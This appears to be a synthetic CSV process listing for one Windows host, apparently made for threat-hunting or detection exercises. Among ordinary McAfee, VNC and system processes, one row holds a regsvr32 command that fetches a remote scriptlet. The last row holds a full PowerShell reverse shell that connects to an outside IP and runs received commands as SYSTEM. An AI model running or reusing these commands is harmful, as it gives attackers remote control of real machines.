@@ -1,0 +1,68 @@
+hostname,name,arguments,username,path,pid
+WW986OFE,modulecoreservice.exe,"""c:\program files\common files\mcafee\modulecore\modulecoreservice.exe""",carwilliam,c:\program files\common files\mcafee\modulecore,2033
+WW986OFE,svchost.exe,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted,NT AUTHORITY\SYSTEM,C:\Windows\System32,2060
+WW986OFE,MpCmdRun.exe,"""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SpyNetServiceDss -RestrictPrivileges -AccessKey 5BDCBEBD-E077-6957-0484-82901932C7EC -Reinvoke",NT AUTHORITY\SYSTEM,C:\Program Files\Windows Defender,3852
+WW986OFE,vmware-usbarbitrator64.exe,"""C:\Program Files (x86)\Common Files\VMware\USB\vmware-usbarbitrator64.exe""",jackson.haye,C:\Program Files (x86)\Common Files\VMware\USB,6395
+WW986OFE,svchost.exe,C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted,NT AUTHORITY\SYSTEM,C:\Windows\system32,4572
+WW986OFE,lsass.exe,C:\Windows\system32\lsass.exe,NT AUTHORITY\SYSTEM,C:\Windows\system32,4
+WW986OFE,McInstruTrack.exe,C:\ProgramData\McAfee\McInstruTrack\McInstruTrack.exe /SP:0,carwilliam,C:\ProgramData\McAfee\McInstruTrack,6347
+WW986OFE,dllhost.exe,C:\Windows\system32\dllhost.exe /Processid:{A7CCA429-5F8F-4A5B-B524-82C38D561286},NT AUTHORITY\SYSTEM,C:\Windows\system32,1360
+WW986OFE,vncviewer.exe,"""C:\Program Files\RealVNC\VNC Viewer\vncviewer.exe"" ",jackson.haye,C:\Program Files\RealVNC\VNC Viewer,3557
+WW986OFE,conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,NT AUTHORITY\SYSTEM,C:\Windows\system32,4040
+WW986OFE,SearchUI.exe,"""C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe"" -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca",NT AUTHORITY\SYSTEM,C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy,4896
+WW986OFE,dllhost.exe,C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235},NT AUTHORITY\SYSTEM,C:\Windows\system32,3400
+WW986OFE,winlogon.exe,winlogon.exe,NT AUTHORITY\SYSTEM,C:\Windows\system32,5716
+WW986OFE,mcuicnt.exe,"""C:\Program Files\Common Files\mcafee\Platform\mcuicnt.exe"" ""C:\Program Files\Common Files\McAfee\ActWiz\mcactwiz.dll"" nosplash:",carwilliam,C:\Program Files\Common Files\mcafee\Platform,3142
+WW986OFE,TabTip32.exe,/loadhooks /Parent:0000000000001188,NT AUTHORITY\SYSTEM,C:\Program Files (x86)\Common Files\Microsoft Shared\Ink,4284
+WW986OFE,mcafee_trial_setup_433.0207.3919_key.exe,"""C:\Users\carwilliam\AppData\Local\Temp\scoped_dir9616_4071\mcafee_trial_setup_433.0207.3919_key.exe"" ",carwilliam,C:\Users\carwilliam\AppData\Local\Temp\scoped_dir9616_4071,5725
+WW986OFE,msdtc.exe,C:\Windows\System32\msdtc.exe,NT AUTHORITY\SYSTEM,C:\Windows\System32,3708
+WW986OFE,tvnserver.exe,"""C:\Program Files\TightVNC\tvnserver.exe"" -controlservice -slave",jackson.haye,C:\Program Files\TightVNC,3147
+WW986OFE,WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" ",carwilliam,C:\Program Files\Microsoft Office\root\Office16,5534
+WW986OFE,regsvr32.exe,C:\Windows\System32\regsvr32 /u /n /s /i:\\experiencedrocks.com\WM7DMC.sct scrobj.dll,jor.ramirez40,C:\Windows\System32\regsvr32.exe,5052
+WW986OFE,McCSPServiceHost.exe,"""C:\Program Files\Common Files\McAfee\CSP\3.0.127.0\\McCSPServiceHost.exe""",carwilliam,C:\Program Files\Common Files\McAfee\CSP\3.0.127.0,774
+WW986OFE,McPvTray.exe,"""C:\Program Files\McAfee\MAT\McPvTray.exe""",carwilliam,C:\Program Files\McAfee\MAT,2780
+WW986OFE,winlogon.exe,winlogon.exe,NT AUTHORITY\SYSTEM,C:\Windows\system32,5648
+WW986OFE,vmware-authd.exe,"""C:\Program Files (x86)\VMware\VMware Player\vmware-authd.exe""",jackson.haye,C:\Program Files (x86)\VMware\VMware Player,566
+WW986OFE,svchost.exe,C:\Windows\system32\svchost.exe -k RPCSS,NT AUTHORITY\SYSTEM,C:\Windows\system32,3204
+WW986OFE,svchost.exe,C:\Windows\System32\svchost.exe -k termsvcs,NT AUTHORITY\SYSTEM,C:\Windows\System32,1504
+WW986OFE,Explorer.EXE,C:\Windows\Explorer.EXE,NT AUTHORITY\SYSTEM,C:\Windows,676
+WW986OFE,ShellExperienceHost.exe,"""C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe"" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca",NT AUTHORITY\SYSTEM,C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy,640
+WW986OFE,svchost.exe,C:\Windows\system32\svchost.exe -k UnistackSvcGroup,NT AUTHORITY\SYSTEM,C:\Windows\system32,220
+WW986OFE,svchost.exe,C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted,NT AUTHORITY\SYSTEM,C:\Windows\System32,1152
+WW986OFE,svchost.exe,C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork,NT AUTHORITY\SYSTEM,C:\Windows\system32,2956
+WW986OFE,McDiReg.exe,C:\ProgramData\McAfee\Direct\McDiReg.exe -MONITOR_PI2 9508,carwilliam,C:\ProgramData\McAfee\Direct,6224
+WW986OFE,McAMTaskAgent.exe,"""C:\Program Files\Common Files\McAfee\TaskScheduler\McAMTaskAgent.exe"" -Embedding",carwilliam,C:\Program Files\Common Files\McAfee\TaskScheduler,442
+WW986OFE,McDiReg.exe,"""C:\ProgramData\McAfee\Direct\McDiReg.exe"" ",carwilliam,C:\ProgramData\McAfee\Direct,3349
+WW986OFE,svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,NT AUTHORITY\SYSTEM,C:\Windows\System32,912
+WW986OFE,mchost.exe,"""C:\Program Files\Common Files\McAfee\Platform\Core\mchost.exe"" {e05dd3fd-ba47-4235-85a5-3789db83c8e1} /pid=444",carwilliam,C:\Program Files\Common Files\McAfee\Platform\Core,4064
+WW986OFE,svchost.exe,C:\Windows\system32\svchost.exe -k DcomLaunch,NT AUTHORITY\SYSTEM,C:\Windows\system32,3120
+WW986OFE,PEFService.exe,"""C:\Program Files\Common Files\McAfee\PEF\CORE\PEFService.exe""",carwilliam,C:\Program Files\Common Files\McAfee\PEF\CORE,5273
+WW986OFE,dwm.exe,"""dwm.exe""",NT AUTHORITY\SYSTEM,C:\Windows\system32,3164
+WW986OFE,svchost.exe,C:\Windows\system32\svchost.exe -k NetworkService,NT AUTHORITY\SYSTEM,C:\Windows\system32,1696
+WW986OFE,svchost.exe,C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted,NT AUTHORITY\SYSTEM,C:\Windows\system32,4356
+WW986OFE,svchost.exe,C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation,NT AUTHORITY\SYSTEM,C:\Windows\system32,2776
+WW986OFE,RuntimeBroker.exe,C:\Windows\System32\RuntimeBroker.exe -Embedding,NT AUTHORITY\SYSTEM,C:\Windows\System32,2256
+WW986OFE,putty.exe,"""C:\Program Files\PuTTY\putty.exe"" ",jor.ramirez40,C:\Program Files\PuTTY,4380
+WW986OFE,OneDrive.exe,"""C:\Users\jackson.haye\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" ",jackson.haye,C:\Users\jackson.haye\AppData\Local\Microsoft\OneDrive,5998
+WW986OFE,svchost.exe,C:\Windows\system32\svchost.exe -k appmodel,NT AUTHORITY\SYSTEM,C:\Windows\system32,2952
+WW986OFE,svchost.exe,C:\Windows\System32\svchost.exe -k utcsvc,NT AUTHORITY\SYSTEM,C:\Windows\System32,1112
+WW986OFE,LogonUI.exe,"""LogonUI.exe"" /flags:0x0 /state0:0xa3a5d855 /state1:0x41c64e6d",NT AUTHORITY\SYSTEM,C:\Windows\system32,6484
+WW986OFE,dwm.exe,"""dwm.exe""",NT AUTHORITY\SYSTEM,C:\Windows\system32,1448
+WW986OFE,svchost.exe,C:\Windows\System32\svchost.exe -k smbsvcs,NT AUTHORITY\SYSTEM,C:\Windows\System32,5916
+WW986OFE,svchost.exe,C:\Windows\system32\svchost.exe -k LocalService,NT AUTHORITY\SYSTEM,C:\Windows\system32,5540
+WW986OFE,taskhostw.exe,taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E},NT AUTHORITY\SYSTEM,C:\Windows\System32,168
+WW986OFE,UIHost.exe,"""C:\Program Files\McAfee\WebAdvisor\UIHost.exe"" ",carwilliam,C:\Program Files\McAfee\WebAdvisor,2241
+WW986OFE,MFEAvSvc.exe,"""C:\Program Files\McAfee\MfeAV\MFEAvSvc.exe""",carwilliam,C:\Program Files\McAfee\MfeAV,2368
+WW986OFE,spoolsv.exe,C:\Windows\System32\spoolsv.exe,NT AUTHORITY\SYSTEM,C:\Windows\System32,3548
+WW986OFE,McApExe.exe,"""C:\Program Files\Common Files\McAfee\VSCore_18_6\McApExe.exe""",carwilliam,C:\Program Files\Common Files\McAfee\VSCore_18_6,3666
+WW986OFE,MicrosoftEdgeCP.exe,"""C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdgeCP.exe"" -ServerName:ContentProcess.AppX6z3cwk4fvgady6zya12j1cw28d228a7k.mca",jackson.haye,C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe,4639
+WW986OFE,ServiceHost.exe,"""C:\Program Files\McAfee\WebAdvisor\ServiceHost.exe""",carwilliam,C:\Program Files\McAfee\WebAdvisor,3428
+WW986OFE,tvnserver.exe,"""C:\Program Files\TightVNC\tvnserver.exe"" -service",jackson.haye,C:\Program Files\TightVNC,2701
+WW986OFE,ProtectedModuleHost.exe,"""C:\\Program Files\\Common Files\\McAfee\ModuleCore\\ProtectedModuleHost.exe""",carwilliam,C:\Program Files\Common Files\McAfee\ModuleCore,824
+WW986OFE,powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",jor.ramirez40,C:\Windows\System32\WindowsPowerShell\v1.0,417
+WW986OFE,MMSSHOST.EXE,"""C:\Program Files\Common Files\McAfee\MMSSHost\MMSSHOST.EXE"" MMSCOM homenetsvc",carwilliam,C:\Program Files\Common Files\McAfee\MMSSHost,2242
+WW986OFE,mcshield.exe,"""C:\Program Files\Common Files\McAfee\AMCore\mcshield.exe""",carwilliam,C:\Program Files\Common Files\McAfee\AMCore,2443
+WW986OFE,sihost.exe,sihost.exe,NT AUTHORITY\SYSTEM,C:\Windows\System32,5704
+WW986OFE,iexplore.exe,"""C:\Program Files\internet explorer\iexplore.exe"" ",carwilliam,C:\Program Files\internet explorer,1165
+WW986OFE,ModuleCoreService.exe,ModuleCoreService.exe /startUserModeHosting=4_TIME_TO_DIE,carwilliam,c:\program files\common files\mcafee\modulecore,3345
+WW986OFE,powershell.exe,"$client = New-Object System.Net.Sockets.TCPClient(""173.105.144.212"",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ""PS "" + (pwd).Path + ""> "";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",NT AUTHORITY\SYSTEM,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,1016
